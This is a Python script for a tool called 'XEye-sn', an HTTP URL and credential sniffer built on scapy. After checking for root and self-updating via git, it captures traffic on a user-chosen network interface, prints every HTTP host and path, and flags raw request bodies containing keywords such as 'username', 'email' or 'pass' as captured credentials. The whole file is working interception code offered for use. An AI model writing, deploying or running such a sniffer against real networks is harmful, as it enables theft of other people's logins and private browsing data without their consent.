#! /usr/bin/env python3

import scapy.all as sc
from scapy.layers import http
import subprocess
import re
import time
def userm():
    print("\n\n***XEye-sn******XEye-sn******XEye-sn******XEye-sn******XEye-sn******XEye-sn***")
    time.sleep(1)
    print("\n[Welcoming] --> Welcome to the XEye Easy HTTP URLs and Credentials sniffer")
    print("[Recommended] --> If you have any question, please contact us on our FB official page: https://www.facebook.com/XEyecs ")
    interf = input("--> [Required] --> Enter the interface for sniffing: ")
    aski = input("[Asking] --> would like to store the sniffed data? [yes(y)/no(n)] ")
    if aski.lower() == 'y' or aski.lower() == 'yes':
        stor = "True"
        print("[Info] --> Sniffing is started on "+interf+" .......")
        snf(interf, stor)
    if aski.lower() == 'n' or aski.lower() == 'no':
        stor = "False"
        print("[Info] --> Sniffing is started on " + interf + " .......")
        snf(interf,stor)


def snf (interf, stor):
    sc.sniff(iface=interf, store=stor, prn=paket)
def paket(paket):
    if paket.haslayer(http.HTTPRequest):
        httpurl = paket[http.HTTPRequest].Host + paket[http.HTTPRequest].Path
        print("[Info] --> HTTP URL Detected: "+str(httpurl))
        if paket.haslayer(sc.Raw):
            cred = paket[sc.Raw].load
            keyws = ["uname", "username", "Username", "Email", "Emails", "email", "emails", "pass", "pasw", "id", "userid"]
            for keyw in keyws:
                if keyw in str(cred):
                    print("\n*************************************************************************")
                    print(" [Congrats] --> Credintials detected in this line: --> "+str(cred))
                    print("\n*************************************************************************")
                    break
def Checkroot():
    who = subprocess.check_output('whoami')
    chuser = re.search(r"root", str(who))
    if chuser:
        udte()
    else:
        print("\n\n [Warning] --> You are not root Please run \"XEye-sn\" with \"sudo\" - Exiting .....\n ")
        time.sleep(2)
        exit()
def udte():
    print("\n[Info] --> The XEye-sn tool will check for updates, please wait .....\n\n")
    time.sleep(2)
    chupd = subprocess.check_output(['git','pull'])
    chked = re.search(r"Already up to date", str(chupd))
    chkeds = re.search(r"actualizado", str(chupd))
    bupted = re.search(r"changed,", str(chupd))
    if chked or chkeds:
        #print("\n[Congrats] --> the tool is "+str(chked[0].lower()))
        print("\n[Congrats] --> The XEye-sn tool on your PC is already up to date")
        time.sleep(2)
        userm()
    else:
        print("\n[Info] --> The XEye-sn tool will be updated, please wait ...... \n")
        time.sleep(3)
        if bupted:
            print("\n[Congrats] --> XEye-sn on your machine is up to date")
            time.sleep(3)
            print("[Instruction] --> Please rerun XEye-sn so the updates will take effect.   Exiting ........")
            time.sleep(2)
            exit()
        else:
            print("\n[Warning] --> The tool couldn't be updated, please try again or reclone the tool by following the next instructions \n")
            time.sleep(3)
            print("\n[Instruction] --> Remove the \"XEye-sn\" folder by by going up one directory by running this command \"cd ..\" ")
            print("\n[Instruction] -->  then run this cmd \"rm -rf XEye-sn\" to remove the XEye-sn folder ")
            print("\n[Instruction] --> Run this command \"git clone https://github.com/Engmostafa26/XEye-sn.git\" ")
            print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
            exit()
Checkroot()
